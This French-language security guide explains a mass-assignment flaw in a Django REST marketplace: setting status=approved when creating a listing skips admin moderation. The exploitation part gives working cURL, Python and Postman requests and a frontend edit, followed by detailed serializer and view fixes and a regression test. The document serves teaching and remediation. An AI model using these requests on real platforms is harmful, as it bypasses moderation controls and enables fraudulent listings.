# 🔓 Guide Complet de la Vulnérabilité - Marketplace

## 📋 Table des Matières

1. [Objectif du Site et Fonctionnement](#objectif-du-site)
2. [Comment Utiliser la Vulnérabilité](#utilisation-de-la-vulnérabilité)
3. [Comment Corriger la Vulnérabilité](#correction-de-la-vulnérabilité)

---

## 🎯 Objectif du Site et Fonctionnement

### Objectif du Site

**Marketplace** est une plateforme de vente en ligne permettant aux utilisateurs de publier des annonces pour vendre ou louer des **voitures** et des **propriétés immobilières**.

### Fonctionnalités Principales

1. **Authentification Utilisateur**
   - Inscription avec numéro de téléphone
   - Connexion avec téléphone + mot de passe
   - Authentification JWT (JSON Web Tokens)

2. **Gestion des Annonces**
   - Création d'annonces (voitures ou propriétés)
   - Upload d'images (jusqu'à 10 images par annonce)
   - Détails spécifiques selon le type (voiture: marque, modèle, année, etc. / propriété: chambres, salles de bain, superficie, etc.)

3. **Système de Modération**
   - Les annonces sont créées avec le statut `pending` (en attente)
   - L'administrateur doit approuver (`approved`) ou rejeter (`rejected`) chaque annonce
   - Seules les annonces approuvées sont visibles publiquement

4. **Types d'Annonces**
   - **Simple**: 25$ de frais de publication
   - **Star**: 50$ de frais de publication (mise en avant)

5. **Tableau de Bord Admin**
   - Visualisation de toutes les annonces
   - Approbation/Rejet des annonces en attente
   - Gestion des utilisateurs

### Flux de Travail Normal

```
1. Utilisateur crée un compte
   ↓
2. Utilisateur crée une annonce
   ↓
3. Annonce est sauvegardée avec status="pending"
   ↓
4. Admin voit l'annonce dans "Pending"
   ↓
5. Admin approuve ou rejette
   ↓
6. Si approuvée → status="approved" → visible publiquement
   Si rejetée → status="rejected" → non visible
```

### Architecture Technique

- **Backend**: Django REST Framework (Python)
- **Frontend**: React + TypeScript
- **Base de données**: MySQL
- **Authentification**: JWT (JSON Web Tokens)
- **API**: RESTful API

### Modèle de Données

**Listing (Annonce)**:
- `id`: Identifiant unique
- `title`: Titre de l'annonce
- `description`: Description détaillée
- `type`: `car` ou `property`
- `purpose`: `sale` ou `rent`
- `price`: Prix
- `currency`: Devise (AED par défaut)
- `location`: Localisation
- `status`: `pending`, `approved`, `rejected`, `sold`
- `ad_type`: `simple` ou `star`
- `user`: Utilisateur propriétaire
- `created_at`: Date de création
- `updated_at`: Date de mise à jour

**Statuts des Annonces**:
- `pending`: En attente d'approbation (par défaut)
- `approved`: Approuvée et visible publiquement
- `rejected`: Rejetée par l'admin
- `sold`: Marquée comme vendue

---

## 🔓 Comment Utiliser la Vulnérabilité

### Description de la Vulnérabilité

**Problème**: Le champ `status` peut être défini directement lors de la création d'une annonce, permettant de contourner le processus d'approbation administrateur.

**Impact**: Un utilisateur malveillant peut créer des annonces directement approuvées sans attendre la validation de l'administrateur.

### Étape 1: Obtenir un Token d'Authentification

#### 1.1 Se Connecter

**Méthode 1: Postman**

1. Ouvrir Postman
2. Créer une nouvelle requête
3. Méthode: `POST`
4. URL: `http://localhost:8000/api/auth/login/`
5. Headers:
   ```
   Content-Type: application/json
   ```
6. Body (raw JSON):
   ```json
   {
     "phone": "+22242038210",
     "password": "votre_mot_de_passe"
   }
   ```
7. Cliquer sur **Send**

**Méthode 2: cURL**

```bash
curl -X POST http://localhost:8000/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{
    "phone": "+22242038210",
    "password": "votre_mot_de_passe"
  }'
```

**Méthode 3: Python**

```python
import requests

response = requests.post(
    "http://localhost:8000/api/auth/login/",
    json={
        "phone": "+22242038210",
        "password": "votre_mot_de_passe"
    }
)

token = response.json()['tokens']['access']
print(f"Token: {token}")
```

#### 1.2 Récupérer le Token

La réponse contient:
```json
{
  "user": {...},
  "tokens": {
    "access": "eyJ0eXAiOiJKV1QiLCJhbGc...",
    "refresh": "eyJ0eXAiOiJKV1QiLCJhbGc..."
  }
}
```

**Copier le token `access`** - vous en aurez besoin pour l'étape suivante.

---

### Étape 2: Créer une Annonce avec la Vulnérabilité

#### 2.1 Utiliser Postman (Recommandé)

1. **Créer une nouvelle requête**
   - Méthode: `POST`
   - URL: `http://localhost:8000/api/listings/`

2. **Ajouter l'en-tête d'authentification**
   - Onglet **Headers**
   - Key: `Authorization`
   - Value: `Bearer VOTRE_TOKEN_ACCESS`

3. **Configurer le Body**
   - Onglet **Body**
   - Sélectionner **form-data**

4. **Ajouter les champs suivants:**

| Key | Type | Value |
|-----|------|-------|
| `title` | Text | `Voiture de Luxe - Contournement Admin` |
| `description` | Text | `Cette annonce a contourné l'approbation admin!` |
| `type` | Text | `car` |
| `purpose` | Text | `sale` |
| `price` | Text | `50000` |
| `currency` | Text | `AED` |
| `location` | Text | `Dubai` |
| `ad_type` | Text | `simple` |
| **`status`** | **Text** | **`approved`** ⚠️ **CHAMP VULNÉRABLE** |
| `images` | **File** | Sélectionner une image (optionnel) |
| `images` | **File** | Sélectionner une autre image (optionnel) |

**Important**: 
- Le champ `status` avec la valeur `approved` contourne l'approbation admin
- Vous pouvez ajouter jusqu'à 10 images
- Changez le type de `images` de Text à **File**

5. **Cliquer sur Send**

#### 2.2 Utiliser cURL

```bash
curl -X POST http://localhost:8000/api/listings/ \
  -H "Authorization: Bearer VOTRE_TOKEN_ACCESS" \
  -F "title=Voiture de Luxe" \
  -F "description=Description de la voiture" \
  -F "type=car" \
  -F "purpose=sale" \
  -F "price=50000" \
  -F "currency=AED" \
  -F "location=Dubai" \
  -F "ad_type=simple" \
  -F "status=approved" \
  -F "images=@/chemin/vers/image1.jpg" \
  -F "images=@/chemin/vers/image2.jpg"
```

#### 2.3 Utiliser Python

```python
import requests

url = "http://localhost:8000/api/listings/"
token = "VOTRE_TOKEN_ACCESS"

headers = {
    "Authorization": f"Bearer {token}"
}

# Données textuelles
data = {
    "title": "Voiture de Luxe",
    "description": "Description de la voiture",
    "type": "car",
    "purpose": "sale",
    "price": "50000",
    "currency": "AED",
    "location": "Dubai",
    "ad_type": "simple",
    "status": "approved"  # ⚠️ CHAMP VULNÉRABLE
}

# Images (optionnel)
files = [
    ('images', open('image1.jpg', 'rb')),
    ('images', open('image2.jpg', 'rb'))
]

response = requests.post(url, headers=headers, data=data, files=files)
print(response.json())

# Fermer les fichiers
for file in files:
    file[1].close()
```

#### 2.4 Modifier le Frontend

**Fichier**: `frontEnd/src/lib/api.ts`

**Localisation**: Fonction `createListing` (ligne ~268)

**Modification**:
```typescript
// Avant
formData.append('ad_type', data.adType || 'simple');

// Après - Ajouter cette ligne
formData.append('ad_type', data.adType || 'simple');
formData.append('status', 'approved');  // ⚠️ VULNÉRABILITÉ
```

Maintenant, toutes les annonces créées depuis le frontend seront automatiquement approuvées!

---

### Étape 3: Vérifier le Succès

#### 3.1 Vérifier la Réponse

La réponse devrait contenir:
```json
{
  "id": 123,
  "title": "Voiture de Luxe",
  "status": "approved",  // ✅ Directement approuvé!
  "created_at": "2024-01-15T10:30:00Z",
  ...
}
```

#### 3.2 Vérifier sur le Site

1. Ouvrir le navigateur
2. Aller à: `http://localhost:5173/` (ou votre URL frontend)
3. **L'annonce devrait apparaître directement sur la page principale!**
4. **Elle n'apparaîtra PAS dans "Pending" du Dashboard Admin**

#### 3.3 Vérifier dans le Dashboard Admin

1. Se connecter en tant qu'admin
2. Aller au Dashboard Admin
3. **L'annonce ne devrait PAS apparaître dans la liste "Pending"**
4. Elle devrait apparaître dans la liste générale avec `status: approved`

---

### Valeurs Possibles pour le Champ `status`

| Valeur | Description |
|--------|-------------|
| `"pending"` | En attente d'approbation (par défaut) |
| `"approved"` | ✅ **Approuvé directement** (vulnérabilité) |
| `"rejected"` | Rejeté |
| `"sold"` | Marqué comme vendu |

---

### Exemple Complet avec Tous les Champs

```bash
POST http://localhost:8000/api/listings/
Authorization: Bearer VOTRE_TOKEN
Content-Type: multipart/form-data

# Champs de base
title: Voiture de Luxe BMW X5
description: Magnifique voiture de luxe en parfait état
type: car
purpose: sale
price: 150000
currency: AED
location: Dubai Marina
ad_type: star
status: approved  ⚠️ CHAMP VULNÉRABLE

# Images (jusqu'à 10)
images: [FILE] voiture1.jpg
images: [FILE] voiture2.jpg
images: [FILE] voiture3.jpg

# Détails de la voiture (optionnel)
car_details[make]: BMW
car_details[model]: X5
car_details[year]: 2023
car_details[mileage]: 5000
car_details[fuel_type]: petrol
car_details[transmission]: automatic
car_details[color]: Black
```

---

## 🛡️ Comment Corriger la Vulnérabilité

### Étape 1: Retirer le Champ `status` du Serializer

**Fichier**: `BackEnd/listings/serializers.py`

**Localisation**: Classe `ListingCreateSerializer` (ligne ~64)

#### Avant (Vulnérable):
```python
class ListingCreateSerializer(serializers.ModelSerializer):
    class Meta:
        model = Listing
        fields = [
            'title', 'description', 'type', 'purpose', 'price', 'currency',
            'location', 'ad_type', 'images', 'car_details', 'property_details',
            'status'  # ⚠️ VULNÉRABLE - Permet la manipulation directe
        ]
```

#### Après (Sécurisé):
```python
class ListingCreateSerializer(serializers.ModelSerializer):
    class Meta:
        model = Listing
        fields = [
            'title', 'description', 'type', 'purpose', 'price', 'currency',
            'location', 'ad_type', 'images', 'car_details', 'property_details'
            # 'status' retiré - ne peut plus être défini lors de la création
        ]
```

---

### Étape 2: Forcer le Statut à `pending` lors de la Création

**Fichier**: `BackEnd/listings/serializers.py`

**Localisation**: Méthode `create` de `ListingCreateSerializer` (ligne ~123)

#### Avant (Vulnérable):
```python
def create(self, validated_data):
    images_data = validated_data.pop('images', [])
    car_details_data = validated_data.pop('car_details', None)
    property_details_data = validated_data.pop('property_details', None)
    
    user = self.context['request'].user
    validated_data['user'] = user
    
    # ⚠️ VULNÉRABILITÉ: Si status est dans validated_data, il sera utilisé
    listing = Listing.objects.create(**validated_data)
    ...
```

#### Après (Sécurisé):
```python
def create(self, validated_data):
    images_data = validated_data.pop('images', [])
    car_details_data = validated_data.pop('car_details', None)
    property_details_data = validated_data.pop('property_details', None)
    
    user = self.context['request'].user
    validated_data['user'] = user
    
    # ✅ SÉCURISÉ: Forcer le statut à 'pending' toujours
    validated_data['status'] = 'pending'  # Force le statut, ignore toute valeur fournie
    
    listing = Listing.objects.create(**validated_data)
    ...
```

---

### Étape 3: Ajouter une Validation Supplémentaire

**Fichier**: `BackEnd/listings/serializers.py`

**Ajouter une méthode de validation**:

```python
class ListingCreateSerializer(serializers.ModelSerializer):
    # ... autres champs ...
    
    def validate(self, attrs):
        """Validation globale pour empêcher la manipulation du statut."""
        # Si status est présent dans les données, le rejeter
        if 'status' in attrs:
            raise serializers.ValidationError({
                'status': 'Vous ne pouvez pas définir le statut lors de la création. Toutes les annonces commencent avec le statut "pending".'
            })
        return attrs
    
    def create(self, validated_data):
        # ... code existant ...
        
        # S'assurer que le statut est toujours 'pending'
        validated_data['status'] = 'pending'
        
        listing = Listing.objects.create(**validated_data)
        # ... reste du code ...
```

---

### Étape 4: Vérifier les Permissions dans la Vue

**Fichier**: `BackEnd/listings/views.py`

**Localisation**: Classe `ListingViewSet` (ligne ~11)

S'assurer que seuls les admins peuvent modifier le statut:

```python
class ListingViewSet(viewsets.ModelViewSet):
    # ... code existant ...
    
    def perform_create(self, serializer):
        """Créer une annonce et forcer le statut à 'pending'."""
        # Ignorer toute valeur de status fournie
        serializer.save(
            user=self.request.user,
            status='pending'  # Toujours 'pending' pour les nouveaux utilisateurs
        )
    
    def perform_update(self, serializer):
        """Mettre à jour une annonce."""
        instance = serializer.instance
        
        # Seuls les admins peuvent changer le statut
        if 'status' in serializer.validated_data:
            if not self.request.user.is_staff:
                # Retirer le statut des données validées pour les non-admins
                serializer.validated_data.pop('status')
        
        serializer.save()
```

---

### Étape 5: Tester la Correction

#### 5.1 Tester que le Statut ne peut plus être Défini

**Test avec Postman**:

1. Créer une requête POST vers `/api/listings/`
2. Ajouter `status: approved` dans le body
3. **Résultat attendu**: Erreur 400 ou le statut est ignoré et reste `pending`

#### 5.2 Vérifier que les Annonces sont Toujours `pending`

```python
# Test Python
import requests

url = "http://localhost:8000/api/listings/"
token = "VOTRE_TOKEN"

headers = {"Authorization": f"Bearer {token}"}
data = {
    "title": "Test",
    "type": "car",
    "purpose": "sale",
    "price": "10000",
    "currency": "AED",
    "location": "Dubai",
    "ad_type": "simple",
    "status": "approved"  # Tentative d'exploitation
}

response = requests.post(url, headers=headers, data=data)
listing = response.json()

# Vérifier que le statut est 'pending' malgré la tentative
assert listing['status'] == 'pending', "Vulnérabilité toujours présente!"
print("✅ Vulnérabilité corrigée!")
```

---

### Étape 6: Documentation de Sécurité

**Créer un fichier**: `BackEnd/SECURITY_FIX.md`

```markdown
# Correction de la Vulnérabilité de Statut

## Problème
Le champ `status` pouvait être défini directement lors de la création d'annonces.

## Solution
1. Retiré `status` des champs autorisés dans `ListingCreateSerializer`
2. Forcé le statut à `pending` dans la méthode `create()`
3. Ajouté validation pour rejeter toute tentative de définition du statut
4. Restreint la modification du statut aux administrateurs uniquement

## Date de Correction
[Date]

## Testé par
[Nom]
```

---

### Résumé des Corrections

| Étape | Action | Fichier | Ligne |
|-------|--------|---------|-------|
| 1 | Retirer `status` des champs | `serializers.py` | ~118 |
| 2 | Forcer `status='pending'` | `serializers.py` | ~131 |
| 3 | Ajouter validation | `serializers.py` | Nouveau |
| 4 | Vérifier permissions | `views.py` | ~84 |
| 5 | Tester | - | - |

---

### Checklist de Sécurité

- [ ] `status` retiré de `ListingCreateSerializer.fields`
- [ ] `status` forcé à `pending` dans `create()`
- [ ] Validation ajoutée pour rejeter `status` dans les données
- [ ] Permissions vérifiées dans les vues
- [ ] Tests effectués et réussis
- [ ] Documentation mise à jour

---

## 📝 Notes Importantes

1. **Après correction**, toutes les nouvelles annonces auront automatiquement le statut `pending`
2. **Seuls les admins** peuvent changer le statut via le Dashboard Admin
3. **Les utilisateurs normaux** ne peuvent plus contourner le processus d'approbation
4. **Tester** la correction avant de déployer en production

---

## 🔗 Références

- [Django REST Framework - Serializers](https://www.django-rest-framework.org/api-guide/serializers/)
- [OWASP - Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [Django Security Best Practices](https://docs.djangoproject.com/en/stable/topics/security/)

---

**Date de création**: 2024  
**Version**: 1.0  
**Auteur**: Guide de Sécurité Marketplace

